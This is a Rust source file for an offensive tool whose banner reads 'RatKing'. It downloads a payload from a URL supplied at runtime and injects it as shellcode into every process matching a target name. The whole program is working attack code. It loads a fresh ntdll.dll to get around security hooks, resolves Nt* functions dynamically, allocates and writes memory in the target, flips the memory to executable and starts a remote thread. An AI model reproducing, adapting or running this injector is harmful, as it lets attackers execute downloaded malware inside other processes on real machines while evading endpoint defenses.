use data::{OpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx};
use data::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, MAXIMUM_ALLOWED, PeMetadata};
use std::ptr::null_mut;
use std::ffi::c_void;
use std::io::{stdin, stdout, Read, Write};
use std::io::prelude::*;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use clap::Parser;

#[derive(Parser)]
struct Args {
    #[arg(short, long)]
    url: String,

    #[arg(short, long)]
    target: String,
}

fn pause() {
    let mut stdout = stdout();
    stdout.write(b"").unwrap();
    stdout.flush().unwrap();
    stdin().read(&mut [0]).unwrap();
}

fn banner() {
    println!("
              .'''''-,              ,-`````.
              `-.._  |              |  _..-'
                 \\    `,          ,'    /
                 '=   ,/          \\,   =`
                 '=   (            )   =`
                .\\    /            \\    /.
               /  `,.'              `.,'  \\
               \\   `.                ,'   /
                \\    \\              /    /
                 \\   .`.  __.---. ,`.   /
                  \\.' .'``        `. `./
                   \\.'  -'''-..     `./
                   /  /        '.      \\
                  /  / .--  .-'''`      '.
                 '   |    ,---.    _      \\
     /``-----._.-.   \\   / ,-. '-'   '.   .-._.-----``\\
     \\__ .     | :    `.' ((O))   ,-.  \\  : |     . __/
      `.  '-...\\_`     |   '-'   ((O)) |  '_/...-`  .'
 .----..)    `    \\     \\      /  '-'  / /    '    (..----.
(o      `.  /      \\     \\    /\\     .' /      \\  .'      o)
 ```---..   `.     /`.    '--'  '---' .'\\     .'   ..---```
         `-.  `.  /`.  `.           .' .'\\  .'  .-'
            `..` /   `.'  ` - - - ' `.'   \\ '..'
                /    /                \\    \\
               /   ,'                  `.   \\
               \\  ,'`.                .'`.  /
                `/    \\              /    \'
                 ,=   (              )   =,
                 ,=   '\\            /`   =,
   RatKing       /    .'            `.    \\
              .-'''  |                |  ```-.
              `......'                `......'   
    ");
}

fn fetchPayload(url: &str) -> Result<Vec<u8>, anyhow::Error> {
    let resp = ureq::get(url)
    .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0")
    .call()?;

    let len: usize = resp.header("Content-Length")
        .unwrap()
        .parse()?;

    let mut bytes: Vec<u8> = Vec::with_capacity(len);
    resp.into_reader()
        .take(10_000_000)
        .read_to_end(&mut bytes)?;

    Ok(bytes)
}

fn findProcess(processId: &str) -> Vec<u32> {
    let mut procList: Vec<u32> = Vec::new();
    let s = System::new_all();

    for process in s.processes_by_exact_name(processId) {
        procList.push(process.pid().as_u32());
    }

    return procList;
}

fn inject(buf: &[u8], processId: &u32) {
    let kernel32 = dinvoke::get_module_base_address("kernel32.dll");
    let ntdll = dinvoke::get_module_base_address("ntdll.dll");
    let freshNtdll: (PeMetadata, i64) = manualmap::read_and_map_module("C:\\Windows\\System32\\ntdll.dll").unwrap();
    let mut newNtdll = freshNtdll.1 as i64;

    pause();
    println!("\n[>] Resolving Addresses of ntdll.dll");
    println!("    |-> Original ntdll.dll: 0x{:X}", ntdll);
    println!("    |-> New copy of ntdll.dll: 0x{:X}", newNtdll);

    unsafe {
        let hProcess;
        let PROCESS_ALL_ACCESS  = 0xFFFF;
        let fnOpenProcess: OpenProcess;
        dinvoke::dynamic_invoke!(
            kernel32,
            "OpenProcess",
            fnOpenProcess,
            hProcess,
            PROCESS_ALL_ACCESS,
            0,
            *processId);

        if let Some(hProcess) = hProcess {

            pause();
            let mut resultPtr;
            let mut base_address : *mut c_void = null_mut();
            let mut shellcode_length = buf.len();
            let fnNtAllocateVirtualMemory: NtAllocateVirtualMemory;
            dinvoke::dynamic_invoke!(
                freshNtdll.1,
                "NtAllocateVirtualMemory",
                fnNtAllocateVirtualMemory,
                resultPtr,
                hProcess,
                &mut base_address,
                0,
                &mut shellcode_length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);

            let mut baseAddr = base_address as i64;

            println!("\n[>] NtAllocateVirtualMemory()");
            println!("    |-> Base Address: 0x{:X}", baseAddr);

            pause();
            let mut bytes_written = 0;
            let buffer = buf.as_ptr() as *mut c_void;
            let buffer_length = buf.len();
            let fnNtWriteVirtualMemory: NtWriteVirtualMemory;
            dinvoke::dynamic_invoke!(
                freshNtdll.1,
                "NtWriteVirtualMemory",
                fnNtWriteVirtualMemory,
                resultPtr,
                hProcess,
                base_address,
                buffer, 
                buffer_length, 
                &mut bytes_written);

            println!("\n[>] NtWriteVirtualMemory()");
            println!("    |-> Shellcode Injected!");

            pause();
            let mut old_perms = PAGE_EXECUTE_READ;
            let fnNtProtectVirtualMemory: NtProtectVirtualMemory;
            dinvoke::dynamic_invoke!(
                freshNtdll.1,
                "NtProtectVirtualMemory",
                fnNtProtectVirtualMemory,
                resultPtr,
                hProcess,
                &mut base_address,
                &mut shellcode_length,
                PAGE_EXECUTE_READ,
                &mut old_perms);

            println!("\n[>] NtProtectVirtualMemory()");
            println!("    |-> Flipping Memory Protection!");

            pause();
            let mut thread_handle : *mut c_void = null_mut();
            let fnNtCreateThreadEx: NtCreateThreadEx;
            dinvoke::dynamic_invoke!(
                freshNtdll.1,
                "NtCreateThreadEx",
                fnNtCreateThreadEx,
                resultPtr,
                &mut thread_handle,
                MAXIMUM_ALLOWED,
                null_mut(),
                hProcess,
                base_address,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut());

            println!("\n[>] NtCreateThreadEx()");
            println!("    |-> Shellcode Executed!");
        }
    }
}

fn main() {

    banner();
    let args = Args::parse();
    pause();    

    println!("[>] Scanning for {}...", args.target.as_str());
    let list: Vec<u32> = findProcess(&args.target);

    if list.len() == 0 
    {
        println!("    |-> [-] Process does not exists!");
    } 
    else 
    {
        for process in &list {
            println!("    |-> Found process!");
            println!("    |-> PID: {}", process);

            pause();

            println!("\n[>] Fetching Payload!");
            println!("    |-> URL: {}", args.url.as_str());

            let buf = fetchPayload(args.url.as_str());

            let dll_bytes = match buf {
                Ok(p) => p,
                Err(_) => panic!("    |-> [-] Failed to download file remotely!"),
            };

            inject(&dll_bytes, process);
        }
    }
}